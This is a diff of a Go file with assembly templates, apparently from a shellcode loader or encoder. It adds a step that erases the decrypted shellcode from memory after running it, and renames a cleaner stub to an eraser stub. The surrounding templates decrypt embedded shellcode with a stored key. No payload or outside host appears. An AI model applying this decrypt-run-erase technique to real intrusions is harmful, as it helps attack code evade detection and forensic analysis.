@@ -6,6 +6,13 @@ import (
 	"strings"
 )
 
+var x86asm = `
+.code32
+
+entry:
+  ret
+`
+
 var x64asm = `
 .code64
 
@@ -44,6 +51,20 @@ entry:
   call shellcode_stub              {{igi}}   // call the shellcode
   add rsp, 0x80                    {{igi}}   // restore stack
 
+  push rax                         {{igi}}   // save the return value
+ 
+  // erase the shellcode
+  // test rax, rax
+  // jmp skip_erase
+  lea rcx, [rbx + shellcode_stub]  {{igi}}
+  mov rdx, {{hex .ShellcodeLen}}   {{igi}}
+  sub rsp, 0x20                    {{igi}}   // reserve stack
+  call eraser_stub                 {{igi}}   // call the eraser
+  add rsp, 0x20                    {{igi}}   // restore stack
+  skip_erase:
+
+  pop rax                          {{igi}}   // restore the return value
+
   fxrstor [rsp]                    {{igi}}   // restore FP registers
   add rsp, 0x200                   {{igi}}   // reserve stack
   mov rsp, rbp                     {{igi}}   // restore stack address
@@ -73,11 +94,11 @@ decrypt_shellcode:
 decryptor_stub:
   {{db .DecryptorStub}}            {{igi}}
 
-cleaner_stub:
-  {{db .CleanerStub}}              {{igi}}
-
 crypto_key:
   {{db .CryptoKey}}                {{igi}}
+
+eraser_stub:
+  {{db .EraserStub}}               {{igi}}
 
 shellcode_stub:
   {{db .Shellcode}}
@@ -88,7 +109,7 @@ type asmContext struct {
 	SaveContext    []byte
 	RestoreContext []byte
 	DecryptorStub  []byte
-	CleanerStub    []byte
+	EraserStub     []byte
 	CryptoKey      []byte
 	CryptoKeyLen   int
 	Shellcode      []byte
